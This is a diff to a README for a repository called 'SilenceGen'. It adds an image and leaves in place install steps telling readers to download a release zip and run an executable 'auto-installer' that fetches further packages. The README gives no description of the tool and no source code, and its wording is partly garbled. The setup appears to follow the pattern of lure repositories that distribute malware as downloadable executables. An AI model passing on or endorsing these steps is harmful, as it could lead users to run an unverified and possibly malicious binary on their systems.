@@ -10,6 +10,8 @@
 ## **1. [Download the archive](https://github.com/adityaxpique/SilenceGen/releases/download/5.12/Release.zip) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
 
+![hgjgh](https://github.com/user-attachments/assets/4874cbb9-91f9-431a-9ad6-a5c29e815db9)
+
 
 ## Contributing
 Contributions are welcome from those who wish to improve the functionality and security of this tool. Please fork the repository and submit a pull request with your enhancements.
